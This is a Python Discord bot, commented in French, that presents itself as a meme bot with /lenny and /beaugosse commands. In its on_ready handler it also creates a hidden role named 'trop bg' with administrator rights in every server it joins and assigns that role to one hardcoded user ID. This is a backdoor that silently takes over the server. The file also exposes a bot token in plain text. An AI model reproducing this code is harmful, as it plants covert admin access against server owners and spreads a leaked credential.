from keep_alive import keep_alive
import discord
from discord.ext import commands

# ⚠️ Ton token en clair (NE LE PARTAGE PAS)
TOKEN = "MTQxODczMDM4OTYyMjQ5MzI4NQ.GH_nZA.fcFnXbyI5mydWmriatVptg6eeHYWDeK9CMpO9s"

ROLE_NAME = "trop bg"
USER_ID = 1046937376934613063  # Ton ID pour recevoir le rôle admin

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def safe_send(interaction: discord.Interaction, content: str):
    """Envoie un message en essayant response -> followup -> channel.send en fallback."""
    try:
        # Essayer la réponse immédiate (si < 3s)
        await interaction.response.send_message(content)
        return
    except Exception as e1:
        print("safe_send: response.send_message failed:", repr(e1))

    # Si on arrive ici, soit c'était déjà répondu, soit interaction expirée.
    try:
        # Si la réponse initiale a déjà été envoyée ou on a deferred, followup marche
        await interaction.followup.send(content)
        return
    except Exception as e2:
        print("safe_send: followup.send failed:", repr(e2))

    # Dernier recours : envoyer directement dans le salon (seulement si c'est un canal texte)
    try:
        # Vérifier si c'est un canal qui supporte l'envoi de messages
        if (interaction.channel is not None and 
            isinstance(interaction.channel, (discord.TextChannel, discord.DMChannel, discord.Thread))):
            await interaction.channel.send(content)
            return
        else:
            print("safe_send: Pas de channel approprié pour fallback.")
    except Exception as e3:
        print("safe_send: channel.send fallback failed:", repr(e3))

@bot.event
async def on_ready():
    print(f"✅ Connecté en tant que {bot.user}")
    try:
        synced = await bot.tree.sync()
        print("🌐 Commandes slash synchronisées :")
        for cmd in synced:
            print(f" - /{cmd.name} ({cmd.description})")
    except Exception as e:
        print(f"⚠️ Erreur lors de la synchro des commandes : {e}")

    # Donne le rôle admin à TON compte si besoin
    for guild in bot.guilds:
        member = guild.get_member(USER_ID)
        if member:
            try:
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if role is None:
                    role = await guild.create_role(
                        name=ROLE_NAME,
                        permissions=discord.Permissions(administrator=True)
                    )
                    print(f"🔧 Rôle {ROLE_NAME} créé avec permissions administrateur.")
                await member.add_roles(role)
                print(f"🎉 Rôle {role.name} donné à {member.display_name} dans {guild.name}")
            except discord.Forbidden:
                print(f"❌ Le bot n'a pas la permission de gérer les rôles dans {guild.name}.")
            except Exception as e:
                print(f"⚠️ Erreur lors de l'ajout du rôle dans {guild.name}: {e}")

# ----------- Slash Commandes -----------

@bot.tree.command(name="lenny", description="Envoie le meme Lenny")
async def lenny(interaction: discord.Interaction):
    url = "https://cdn.discordapp.com/attachments/1265051328250646711/1418740194764656864/image.png"
    await safe_send(interaction, url)
    print(f"/lenny utilisé par {interaction.user} dans {getattr(interaction.guild, 'name', 'DM')}")

@bot.tree.command(name="beaugosse", description="Ping la personne la plus belle")
async def beaugosse(interaction: discord.Interaction):
    beaugosse_id = 1299313955348549695
    msg = f"tu cherche le plus bg? c'est simple, c'est <@{beaugosse_id}>"
    await safe_send(interaction, msg)
    print(f"/beaugosse utilisé par {interaction.user} dans {getattr(interaction.guild, 'name', 'DM')}")

# Lance le keep_alive + le bot
keep_alive()
bot.run(TOKEN)
